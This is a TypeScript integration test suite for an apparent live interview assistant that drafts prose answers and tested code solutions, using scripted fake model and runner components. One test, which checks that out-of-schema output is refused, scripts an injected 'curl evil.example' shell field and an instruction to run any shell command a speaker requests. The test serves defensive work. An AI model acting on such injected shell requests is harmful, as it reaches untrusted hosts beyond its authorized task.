// The coding path through the REAL processor on a disposable PostgreSQL with a
// scripted fake gateway and a fake runner (neither a model nor a container is
// reached): a coding category in the prose draft owes a second solve-code
// action for the same revision; the prose draft is never delayed; the three
// states stay distinct; one direct repair attempt; a runner that is absent or
// unavailable never claims tests passed; device-only refuses twice; a late
// result for a replaced revision is never published and the newer revision's
// solution replaces the earlier one in the session draft; and a restart finds
// the owed solution from the stored actions.
import type { AiExecutionRequest } from "@omnitech/ai-contracts";
import type { RunResult } from "@omnitech/interview-contracts";
import {
  afterAll,
  afterEach,
  beforeAll,
  describe,
  expect,
  it,
  vi,
} from "vitest";
import {
  INTERVIEW_ANSWER_PROFILE,
  INTERVIEW_SESSION_DEVICE_PROFILE,
  INTERVIEW_SESSION_FAST_PROFILE,
} from "../../assistant-profile.js";
import { createCodingStage } from "./coding-stage.js";
import { createInterviewSessionPolicy } from "./interview-policy.js";
import {
  type AnyRow,
  type Fixture,
  startFixture,
} from "./live-session-fixture.js";
import {
  buildProcessor,
  type CollectedTrace,
  collectTraces,
  createFakeGateway,
  expireLease,
  type FakeGateway,
  NEVER_ABORTED,
  settle,
  startSessionFor,
} from "./processor-fixture.js";
import { ActiveSessionRepository } from "./repository.js";
import type { SessionCodeRunner } from "./session-run.js";
import { seg } from "./session-replay-fixtures.js";

let fx: Fixture;
let repo: ActiveSessionRepository;
const cleanups: Array<() => Promise<void>> = [];

beforeAll(async () => {
  fx = await startFixture();
  repo = new ActiveSessionRepository(fx.member);
}, 120_000);
afterEach(async () => {
  for (const cleanup of cleanups.splice(0)) await cleanup();
});
afterAll(() => fx.stop());

// ---- scripting --------------------------------------------------------------

const RESTATEMENT = "Implement a rate limiter for a Node service.";
const CONSTRAINTS_BY_REVISION: Record<number, string[]> = {
  1: ["a fixed number of requests per client in a sliding window"],
  2: [
    "a fixed number of requests per client in a sliding window",
    "a small burst above the limit is allowed",
  ],
  3: [
    "a token bucket with a refill rate replaces the sliding window",
    "a small burst above the limit is allowed",
  ],
};
const revisionOf = (request: AiExecutionRequest) =>
  Number(/^REVISION: (\d+)$/m.exec(request.task.prompt)?.[1]);
const briefOf = (request: AiExecutionRequest) => {
  const lines = request.task.prompt.split("\n");
  const at = lines.findIndex((line) => line.startsWith("BEGIN TASK BRIEF"));
  return JSON.parse(lines[at + 1] ?? "{}") as { constraints: string[] };
};
const codingDraft = (request: AiExecutionRequest) => ({
  category: "coding",
  draft: "Restate the problem, then outline the approach.",
  claims: [],
  star: null,
  logistics: null,
  codingBrief: {
    language: "typescript",
    restatement: RESTATEMENT,
    constraints: CONSTRAINTS_BY_REVISION[revisionOf(request)] ?? [],
  },
});
const solutionFor = (
  request: AiExecutionRequest,
  overrides: Record<string, unknown> = {},
) => {
  const constraints = briefOf(request).constraints;
  const revision = revisionOf(request);
  return {
    language: "typescript",
    code: `export const allow = () => ${revision}; // CODE-CANARY-${revision}`,
    testCode: constraints.map((_, i) => `it("t${i}", () => {});`).join("\n"),
    coverage: constraints.map((_, constraintIndex) => ({
      constraintIndex,
      testName: `t${constraintIndex}`,
    })),
    escalation: "none",
    notes: "A map of timestamps per client.",
    ...overrides,
  };
};
const scriptedGateway = (
  options: {
    solution?: (request: AiExecutionRequest, call: number) => unknown;
  } = {},
) => {
  let solutionCalls = 0;
  return createFakeGateway({
    result: (request) => {
      if (!request.task.prompt.startsWith("TASK: solve_code"))
        return codingDraft(request);
      solutionCalls += 1;
      return options.solution?.(request, solutionCalls) ?? solutionFor(request);
    },
  });
};

const runResult = (overrides: Partial<RunResult> = {}): RunResult => ({
  stdout: "",
  stderr: "",
  exitCode: 0,
  durationMs: 12,
  timedOut: false,
  ...overrides,
});
// Reports every test the code declares as passed, unless told otherwise.
const passingTests = (code: string) =>
  [...code.matchAll(/it\("(t\d+)"/g)].map((match) => ({
    name: String(match[1]),
    status: "passed" as const,
  }));
const fakeRunner = (
  script?: (
    call: number,
    input: Parameters<SessionCodeRunner["runAll"]>[0],
  ) => RunResult,
  syntax: "clean" | "none" = "clean",
) => {
  let calls = 0;
  const runAll = vi.fn(
    async (input: Parameters<SessionCodeRunner["runAll"]>[0]) => {
      calls += 1;
      return (
        script?.(calls, input) ??
        runResult({ tests: passingTests(input.testCode) })
      );
    },
  );
  const checkSyntax = vi.fn(async () => runResult());
  const runner: SessionCodeRunner =
    syntax === "clean" ? { runAll, checkSyntax } : { runAll };
  return { runner, runAll, checkSyntax };
};

// ---- a world ------------------------------------------------------------------

async function world(
  name: string,
  options: {
    gateway?: FakeGateway;
    codeRunner?: SessionCodeRunner;
    runnerDeviceLocal?: boolean;
    policy?: "device-only" | "permitted-remote";
    coding?: ReturnType<typeof createCodingStage>;
    wrapStore?: Parameters<typeof buildProcessor>[1]["wrapStore"];
  } = {},
) {
  const started = await startSessionFor(
    fx,
    repo,
    fx.tenantA,
    name,
    options.policy ?? "permitted-remote",
  );
  const trace: CollectedTrace = collectTraces();
  const gateway = options.gateway ?? scriptedGateway();
  const processor = buildProcessor(fx, {
    workerId: `worker-${name}`,
    gateway,
    trace,
    ...(options.codeRunner ? { codeRunner: options.codeRunner } : {}),
    ...(options.runnerDeviceLocal === undefined
      ? {}
      : { runnerDeviceLocal: options.runnerDeviceLocal }),
    ...(options.coding
      ? { policy: createInterviewSessionPolicy({ coding: options.coding }) }
      : {}),
    ...(options.wrapStore ? { wrapStore: options.wrapStore } : {}),
  });
  cleanups.push(async () => {
    gateway.releaseAll();
    await processor.close();
    await repo.controlSession(started.scope, started.sessionId, "end");
  });
  const actions = () => repo.listActions(started.scope, started.sessionId);
  const draft = async (artifactSuffix = "") => {
    const rows = await fx.owner.query(
      "SELECT workspace_id, artifact_id, revision, value, provenance FROM interview.assistant_drafts WHERE actor_id=$1 AND workspace_id=$2",
      [started.person.id, `active-session:${started.sessionId}`],
    );
    return artifactSuffix ? rows.rows : rows.rows[0];
  };
  return { ...started, gateway, processor, trace, actions, draft };
}
type World = Awaited<ReturnType<typeof world>>;

const QUESTION = seg(
  "q1",
  "interviewer",
  0,
  "Can you implement a rate limiter in TypeScript for a Node service that allows a fixed number of requests per client in a sliding window?",
);
const BURSTS = seg(
  "q2",
  "interviewer",
  20_000,
  "Now handle bursts, so allow a small burst above the limit for a client.",
);
const BUCKET = seg(
  "q3",
  "interviewer",
  40_000,
  "Instead, make it a token bucket with a refill rate.",
);
// The candidate's narration between interviewer lines keeps them separate
// utterances (adjacent same-source segments coalesce); it carries no
// constraint cue, so only the interviewer's lines revise the task.
const NARRATE_1 = seg(
  "c1",
  "candidate",
  8_000,
  "I will keep a map from client id to a list of timestamps.",
);
const NARRATE_2 = seg(
  "c2",
  "candidate",
  28_000,
  "That means a bucket per client and a clock passed in as a parameter.",
);
const kinds = (actions: { actionKind: string }[]) =>
  actions.map((action) => action.actionKind);
const solveActions = async (w: World) =>
  (await w.actions()).filter((action) => action.actionKind === "solve-code");

async function until(
  condition: () => boolean | Promise<boolean>,
  what: string,
) {
  for (let i = 0; i < 200; i += 1) {
    if (await condition()) return;
    await new Promise((resolve) => setTimeout(resolve, 25));
  }
  throw new Error(`timed out waiting for ${what}`);
}

// ---- the happy path ---------------------------------------------------------

describe("a coding task owes a second solve-code action", () => {
  it("publishes the prose draft first, then a tested solution into the session-owned draft, with three distinct states recorded", async () => {
    const { runner, runAll, checkSyntax } = fakeRunner();
    const w = await world("code-happy", { codeRunner: runner });
    await w.ingestor.ingest(QUESTION);
    await settle(w.processor);

    const stored = await w.actions();
    expect(kinds(stored)).toEqual(["draft-answer", "solve-code"]);
    expect(stored.map((action) => action.dispatchStatus)).toEqual([
      "succeeded",
      "succeeded",
    ]);
    // Same task and revision; the prose draft was dispatched (and published)
    // before the solution call, and the two calls used their own profiles.
    expect(stored[1]).toMatchObject({
      taskId: stored[0]?.taskId,
      taskRevision: stored[0]?.taskRevision,
    });
    expect(w.gateway.requests.map((request) => request.profileId)).toEqual([
      INTERVIEW_SESSION_FAST_PROFILE,
      INTERVIEW_ANSWER_PROFILE,
    ]);
    expect(w.gateway.requests[1]?.task.type).toBe("structured-generation");
    expect(w.gateway.requests[1]?.processingPolicy).toBe("permitted-remote");

    const result = stored[1]?.result as AnyRow;
    expect(result.states).toEqual({
      generated: true,
      testsPassed: true,
      fullyVerified: true,
      reasons: [],
    });
    expect(result.tests).toMatchObject({ total: 1, passed: 1, failed: 0 });
    expect(result.run).toMatchObject({ available: true, exitCode: 0 });
    expect(result.syntax).toEqual({ checked: true, clean: true });
    expect(result.repair).toEqual({ attempted: false, succeeded: false });
    expect(result.replacesRevision).toBeNull();
    expect(result.workspace).toMatchObject({
      published: true,
      workspaceId: `active-session:${w.sessionId}`,
      artifactRevision: 0,
    });

    // The runner got the solution and its tests with empty stdin.
    expect(runAll).toHaveBeenCalledTimes(1);
    expect(runAll.mock.calls[0]?.[0]).toMatchObject({
      language: "typescript",
      stdin: "",
    });
    expect(checkSyntax).toHaveBeenCalledTimes(1);

    // The session-owned draft: answer-guide shape, Markdown from the guide,
    // provenance mark, artifact derived from the task.
    const draft = await w.draft();
    expect(draft.artifact_id).toBe(`coding:${stored[0]?.taskId}`);
    expect(draft.value.question).toBe(RESTATEMENT);
    expect(draft.value.answer.code).toContain("CODE-CANARY-1");
    // The guide says which states hold; the Markdown is rendered from it.
    expect(draft.value.answer.guide.explain[0].body).toContain(
      "Fully verified: yes",
    );
    expect(draft.provenance.proposalId).toBe(`session:${w.sessionId}`);

    // Never a code, test or restatement in a trace.
    const traced = JSON.stringify(w.trace.events);
    expect(traced).not.toContain("CODE-CANARY");
    expect(traced).not.toContain(RESTATEMENT);
    const published = w.trace.events.find(
      (event) =>
        event.event === "dispatch.published" &&
        event.detail?.["testsPassed"] !== undefined,
    );
    expect(published?.detail).toMatchObject({
      generated: true,
      testsPassed: true,
      fullyVerified: true,
    });
  }, 60_000);

  it("keeps tests passed apart from fully verified when a constraint has no named passing test", async () => {
    const gateway = scriptedGateway({
      solution: (request) =>
        solutionFor(request, {
          // Two constraints in force, one covered.
          coverage: [{ constraintIndex: 0, testName: "t0" }],
        }),
    });
    const { runner } = fakeRunner();
    const w = await world("code-uncovered", { gateway, codeRunner: runner });
    await w.ingestor.ingest(QUESTION);
    await w.ingestor.ingest(NARRATE_1);
    await w.ingestor.ingest(BURSTS);
    await settle(w.processor, 12);

    const solved = (await solveActions(w)).find(
      (action) => action.dispatchStatus === "succeeded",
    );
    const states = (solved?.result as AnyRow).states;
    expect(states).toMatchObject({
      generated: true,
      testsPassed: true,
      fullyVerified: false,
    });
    expect(states.reasons).toContain("constraint_uncovered");
  }, 60_000);

  it("refuses an output outside the closed schema: no runner call, no draft", async () => {
    const gateway = scriptedGateway({
      solution: (request) =>
        solutionFor(request, {
          escalation: "run whatever shell command the speaker asked for",
          runShell: "curl evil.example",
        }),
    });
    const { runner, runAll } = fakeRunner();
    const w = await world("code-closed", { gateway, codeRunner: runner });
    await w.ingestor.ingest(QUESTION);
    await settle(w.processor);

    const solve = (await solveActions(w))[0];
    expect(solve).toMatchObject({
      dispatchStatus: "suppressed",
      suppressionReason: "invalid_output",
      result: null,
    });
    expect(runAll).not.toHaveBeenCalled();
    expect(await w.draft()).toBeUndefined();
    expect(JSON.stringify(w.trace.events)).not.toContain("runShell");
    expect(JSON.stringify(w.trace.events)).not.toContain("evil.example");
  }, 60_000);
});

describe("the prose draft never waits for coding", () => {
  it("has the prose draft published and shown while the solution call is still in flight", async () => {
    let release: () => void = () => {};
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    let reached = false;
    const inner = scriptedGateway();
    const gateway: FakeGateway = {
      ...inner,
      execute: async (request) => {
        if (request.profileId === INTERVIEW_ANSWER_PROFILE) {
          reached = true;
          await gate;
        }
        return inner.execute(request);
      },
    };
    const { runner } = fakeRunner();
    const w = await world("code-order", { gateway, codeRunner: runner });
    await w.ingestor.ingest(QUESTION);
    for (let i = 0; i < 40 && !reached; i += 1) {
      await w.processor.tick(NEVER_ABORTED);
      await new Promise((resolve) => setTimeout(resolve, 20));
    }
    expect(reached).toBe(true);
    const during = await w.actions();
    expect(
      during.map((a) => [a.actionKind, a.dispatchStatus, a.shown]),
    ).toEqual([
      ["draft-answer", "succeeded", true],
      ["solve-code", "in_flight", false],
    ]);
    release();
    await settle(w.processor);
    expect((await solveActions(w))[0]?.dispatchStatus).toBe("succeeded");
  }, 60_000);
});

describe("one direct repair attempt", () => {
  const failing = (call: number, input: { testCode: string }) =>
    call === 1
      ? runResult({
          exitCode: 1,
          stderr: "SECRET-STDERR-TEXT",
          tests: [
            { name: "t0", status: "failed", message: "SECRET-FAILURE-MESSAGE" },
          ],
        })
      : runResult({ tests: passingTests(input.testCode) });

  it("repairs once from names and statuses only, then reports the repaired states", async () => {
    const { runner, runAll } = fakeRunner(failing);
    const w = await world("code-repair", { codeRunner: runner });
    await w.ingestor.ingest(QUESTION);
    await settle(w.processor);

    expect(w.gateway.requests.map((request) => request.profileId)).toEqual([
      INTERVIEW_SESSION_FAST_PROFILE,
      INTERVIEW_ANSWER_PROFILE,
      INTERVIEW_ANSWER_PROFILE,
    ]);
    const repair = w.gateway.requests[2] as AiExecutionRequest;
    expect(repair.idempotencyKey?.endsWith(":repair")).toBe(true);
    expect(repair.task.prompt).toContain("BEGIN FAILED ATTEMPT");
    // Names and statuses only: no message, no output.
    expect(repair.task.prompt).toContain('"status":"failed"');
    expect(repair.task.prompt).not.toContain("SECRET-FAILURE-MESSAGE");
    expect(repair.task.prompt).not.toContain("SECRET-STDERR-TEXT");

    expect(runAll).toHaveBeenCalledTimes(2);
    const result = (await solveActions(w))[0]?.result as AnyRow;
    expect(result.repair).toEqual({ attempted: true, succeeded: true });
    expect(result.states).toMatchObject({
      generated: true,
      testsPassed: true,
      fullyVerified: true,
    });
  }, 60_000);

  it("stops after one repair: still failing publishes as generated with tests not passed", async () => {
    const { runner, runAll } = fakeRunner((call) =>
      runResult({
        exitCode: 1,
        tests: [{ name: "t0", status: "failed" }],
      }),
    );
    const w = await world("code-repair-fails", { codeRunner: runner });
    await w.ingestor.ingest(QUESTION);
    await settle(w.processor);

    expect(
      w.gateway.requests.filter(
        (r) => r.profileId === INTERVIEW_ANSWER_PROFILE,
      ),
    ).toHaveLength(2);
    expect(runAll).toHaveBeenCalledTimes(2);
    const result = (await solveActions(w))[0]?.result as AnyRow;
    expect(result.repair).toEqual({ attempted: true, succeeded: false });
    expect(result.states).toMatchObject({
      generated: true,
      testsPassed: false,
      fullyVerified: false,
    });
    expect(result.states.reasons).toEqual(
      expect.arrayContaining(["exit_nonzero", "test_failed"]),
    );
    // The solution still lands in the draft: generated is not tested.
    expect((await w.draft()).value.answer.code).toContain("CODE-CANARY-1");
  }, 60_000);

  it("treats a timeout as tests not passed", async () => {
    const { runner } = fakeRunner((call, input) =>
      runResult({
        exitCode: null,
        timedOut: true,
        tests: passingTests(input.testCode),
      }),
    );
    const w = await world("code-timeout", { codeRunner: runner });
    await w.ingestor.ingest(QUESTION);
    await settle(w.processor);
    const result = (await solveActions(w))[0]?.result as AnyRow;
    expect(result.states.testsPassed).toBe(false);
    expect(result.states.reasons).toContain("timed_out");
  }, 60_000);
});

describe("no runner", () => {
  it("publishes as generated with tests never claimed passed when no runner is configured", async () => {
    const w = await world("code-no-runner");
    await w.ingestor.ingest(QUESTION);
    await settle(w.processor);
    const result = (await solveActions(w))[0]?.result as AnyRow;
    expect(result.states).toEqual({
      generated: true,
      testsPassed: false,
      fullyVerified: false,
      reasons: ["runner_unavailable", "syntax_unchecked"],
    });
    expect(result.run.available).toBe(false);
    // No repair without a report to repair from.
    expect(result.repair.attempted).toBe(false);
    expect(await w.draft()).toBeDefined();
  }, 60_000);

  it("treats a runner that throws (no Docker) the same way, never reading its message", async () => {
    const runner: SessionCodeRunner = {
      runAll: async () => {
        throw new Error("Docker daemon is unavailable. SECRET-DOCKER-DETAIL");
      },
    };
    const w = await world("code-runner-down", { codeRunner: runner });
    await w.ingestor.ingest(QUESTION);
    await settle(w.processor);
    const result = (await solveActions(w))[0]?.result as AnyRow;
    expect(result.states.generated).toBe(true);
    expect(result.states.testsPassed).toBe(false);
    expect(result.states.reasons).toContain("runner_unavailable");
    expect(JSON.stringify(w.trace.events)).not.toContain(
      "SECRET-DOCKER-DETAIL",
    );
  }, 60_000);
});

describe("device-only", () => {
  it("refuses the solution action at profile resolution (no device profile): no call, no runner, no draft", async () => {
    const { runner, runAll } = fakeRunner();
    const w = await world("code-device", {
      policy: "device-only",
      codeRunner: runner,
      runnerDeviceLocal: true,
    });
    await w.ingestor.ingest(QUESTION);
    await settle(w.processor);

    const stored = await w.actions();
    expect(stored[0]).toMatchObject({
      actionKind: "draft-answer",
      dispatchStatus: "succeeded",
    });
    expect(stored[1]).toMatchObject({
      actionKind: "solve-code",
      dispatchStatus: "suppressed",
      suppressionReason: "stage_unlisted",
    });
    expect(w.gateway.requests.map((r) => r.profileId)).toEqual([
      INTERVIEW_SESSION_DEVICE_PROFILE,
    ]);
    expect(runAll).not.toHaveBeenCalled();
    expect(await w.draft()).toBeUndefined();
  }, 60_000);

  it("refuses again before dispatch when a stage did list a device profile but the host did not declare the runner device-local", async () => {
    const { runner, runAll } = fakeRunner();
    const w = await world("code-device-runner", {
      policy: "device-only",
      codeRunner: runner,
      coding: createCodingStage({
        deviceProfileId: INTERVIEW_SESSION_DEVICE_PROFILE,
      }),
    });
    await w.ingestor.ingest(QUESTION);
    await settle(w.processor);
    const solve = (await solveActions(w))[0];
    expect(solve).toMatchObject({
      dispatchStatus: "suppressed",
      suppressionReason: "runner_not_device_local",
    });
    expect(w.gateway.requests).toHaveLength(1);
    expect(runAll).not.toHaveBeenCalled();
  }, 60_000);

  it("runs on the device profile and the runner only once the host declares the runner device-local", async () => {
    const { runner, runAll } = fakeRunner();
    const w = await world("code-device-local", {
      policy: "device-only",
      codeRunner: runner,
      runnerDeviceLocal: true,
      coding: createCodingStage({
        deviceProfileId: INTERVIEW_SESSION_DEVICE_PROFILE,
      }),
    });
    await w.ingestor.ingest(QUESTION);
    await settle(w.processor);
    expect((await solveActions(w))[0]?.dispatchStatus).toBe("succeeded");
    expect(w.gateway.requests.map((r) => r.profileId)).toEqual([
      INTERVIEW_SESSION_DEVICE_PROFILE,
      INTERVIEW_SESSION_DEVICE_PROFILE,
    ]);
    expect(w.gateway.requests[1]?.processingPolicy).toBe("device-only");
    expect(runAll).toHaveBeenCalledTimes(1);
  }, 60_000);
});

describe("a changed constraint invalidates the earlier solution", () => {
  it("never publishes a late result for a replaced revision, and the newest revision's solution replaces the earlier one in the draft", async () => {
    // The SECOND solution call (revision 2) is held at the gateway while a
    // third revision arrives.
    let release: () => void = () => {};
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    let solutionCalls = 0;
    let reached = false;
    const inner = scriptedGateway();
    const gateway: FakeGateway = {
      ...inner,
      execute: async (request) => {
        if (request.profileId === INTERVIEW_ANSWER_PROFILE) {
          solutionCalls += 1;
          if (solutionCalls === 2) {
            reached = true;
            await gate;
          }
        }
        return inner.execute(request);
      },
    };
    const { runner, runAll } = fakeRunner();
    const w = await world("code-stale", { gateway, codeRunner: runner });

    // Revision 1 is solved and published.
    await w.ingestor.ingest(QUESTION);
    await settle(w.processor);
    const first = await w.draft();
    expect(first.value.answer.code).toContain("CODE-CANARY-1");
    expect(Number(first.revision)).toBe(0);

    // Revision 2 (bursts) reaches the held solution call.
    await w.ingestor.ingest(NARRATE_1);
    await w.ingestor.ingest(BURSTS);
    for (let i = 0; i < 60 && !reached; i += 1) {
      await w.processor.tick(NEVER_ABORTED);
      await new Promise((resolve) => setTimeout(resolve, 20));
    }
    expect(reached).toBe(true);

    // Revision 3 arrives while that call is in flight.
    await w.ingestor.ingest(NARRATE_2);
    await w.ingestor.ingest(BUCKET);
    for (let i = 0; i < 6; i += 1) await w.processor.tick(NEVER_ABORTED);
    expect(w.processor.snapshot(w.sessionId)?.tasks[0]?.revision).toBe(3);
    release();
    await settle(w.processor, 20);

    const solves = await solveActions(w);
    expect(solves.map((a) => [a.taskRevision, a.dispatchStatus])).toEqual([
      [1, "succeeded"],
      [2, "suppressed"],
      [3, "succeeded"],
    ]);
    // The late revision-2 result: suppressed as stale, nothing stored.
    expect(solves[1]).toMatchObject({
      suppressionReason: "revision_stale",
      result: null,
    });
    // The revision-3 solution names the one it replaces and rewrites the draft
    // in place at the revision the session last wrote.
    const third = solves[2]?.result as AnyRow;
    expect(third.replacesRevision).toBe(1);
    expect(third.workspace).toMatchObject({
      published: true,
      artifactRevision: 1,
    });
    const draft = await w.draft();
    expect(draft.value.answer.code).toContain("CODE-CANARY-3");
    expect(draft.value.answer.code).not.toContain("CODE-CANARY-1");
    expect(JSON.stringify(draft.value)).not.toContain("CODE-CANARY-2");
    expect(JSON.stringify(await w.actions())).not.toContain("CODE-CANARY-2");

    // The revision-3 prompt carries the earlier solution as stale context only.
    const prompt = gateway.requests.find(
      (request) =>
        request.profileId === INTERVIEW_ANSWER_PROFILE &&
        revisionOf(request) === 3,
    )?.task.prompt;
    expect(prompt).toContain("BEGIN PRIOR SOLUTION");
    expect(prompt).toContain("CODE-CANARY-1");
    expect(runAll.mock.calls.length).toBeGreaterThanOrEqual(2);
  }, 90_000);

  it("refuses a late publish at the fenced write when the revision changes while the tests run", async () => {
    let release: () => void = () => {};
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    let reached = false;
    const base = fakeRunner();
    const runner: SessionCodeRunner = {
      runAll: async (input) => {
        reached = true;
        await gate;
        return base.runAll(input);
      },
    };
    const w = await world("code-stale-runner", { codeRunner: runner });
    await w.ingestor.ingest(QUESTION);
    for (let i = 0; i < 60 && !reached; i += 1) {
      await w.processor.tick(NEVER_ABORTED);
      await new Promise((resolve) => setTimeout(resolve, 20));
    }
    expect(reached).toBe(true);
    await w.ingestor.ingest(NARRATE_1);
    await w.ingestor.ingest(BURSTS);
    for (let i = 0; i < 6; i += 1) await w.processor.tick(NEVER_ABORTED);
    release();
    await settle(w.processor, 20);

    const solves = await solveActions(w);
    expect(solves[0]).toMatchObject({
      taskRevision: 1,
      dispatchStatus: "suppressed",
      suppressionReason: "revision_stale",
      result: null,
    });
    expect(solves[1]).toMatchObject({
      taskRevision: 2,
      dispatchStatus: "succeeded",
    });
    expect((await w.draft()).value.answer.code).toContain("CODE-CANARY-2");
  }, 90_000);
});

describe("an owner's edit is never overwritten", () => {
  it("holds the late AI result on the action and reports the conflict", async () => {
    const { runner } = fakeRunner();
    const w = await world("code-owner-edit", { codeRunner: runner });
    await w.ingestor.ingest(QUESTION);
    await settle(w.processor);
    // The owner edits the draft (revision bump, provenance cleared).
    await fx.owner.query(
      `UPDATE interview.assistant_drafts
       SET value = jsonb_set(value, '{answer,code}', '"the owner wrote this"'),
           revision = revision + 1, provenance = NULL
       WHERE actor_id=$1 AND workspace_id=$2`,
      [w.person.id, `active-session:${w.sessionId}`],
    );
    await w.ingestor.ingest(NARRATE_1);
    await w.ingestor.ingest(BURSTS);
    await settle(w.processor, 12);

    const solves = await solveActions(w);
    const held = solves.find((a) => a.taskRevision === 2);
    expect(held?.dispatchStatus).toBe("succeeded");
    expect(held?.result).toMatchObject({
      code: expect.stringContaining("CODE-CANARY-2"),
      workspace: { published: false, conflict: true, reason: "owner_edited" },
    });
    const draft = await w.draft();
    expect(draft.value.answer.code).toBe("the owner wrote this");
    expect(Number(draft.revision)).toBe(1);
    expect(
      w.trace.events.find((event) => event.event === "coding.workspace")
        ?.outcome,
    ).toBe("written");
    expect(
      w.trace.events
        .filter((event) => event.event === "coding.workspace")
        .at(-1)?.outcome,
    ).toBe("held");
  }, 60_000);
});

describe("restart safety", () => {
  it("finds the owed solution from the stored actions when the worker died between the prose draft and the solution", async () => {
    const { runner } = fakeRunner();
    const first = await world("code-restart", {
      codeRunner: runner,
      // A crash right after the prose draft published: the solution action is
      // never recorded.
      wrapStore: (store) => ({
        ...store,
        recordAction: async (input) => {
          if (input.actionKind === "solve-code") throw new Error("crash");
          return store.recordAction(input);
        },
      }),
    });
    await first.ingestor.ingest(QUESTION);
    await settle(first.processor, 12);
    expect(kinds(await first.actions())).toEqual(["draft-answer"]);
    await first.processor.close();
    await expireLease(fx, first.sessionId);

    // A fresh worker: a new run, seeded from the stored actions only.
    const gateway = scriptedGateway();
    const trace = collectTraces();
    const successor = buildProcessor(fx, {
      workerId: "worker-code-restart-successor",
      gateway,
      trace,
      codeRunner: runner,
    });
    cleanups.push(() => successor.close());
    await settle(successor, 12);

    const stored = await first.actions();
    expect(kinds(stored)).toEqual(["draft-answer", "solve-code"]);
    expect(stored[1]?.dispatchStatus).toBe("succeeded");
    // The prose draft was NOT regenerated: only the solution call was made.
    expect(gateway.requests.map((r) => r.profileId)).toEqual([
      INTERVIEW_ANSWER_PROFILE,
    ]);
    expect((await first.draft()).value.answer.code).toContain("CODE-CANARY-1");
  }, 90_000);
});
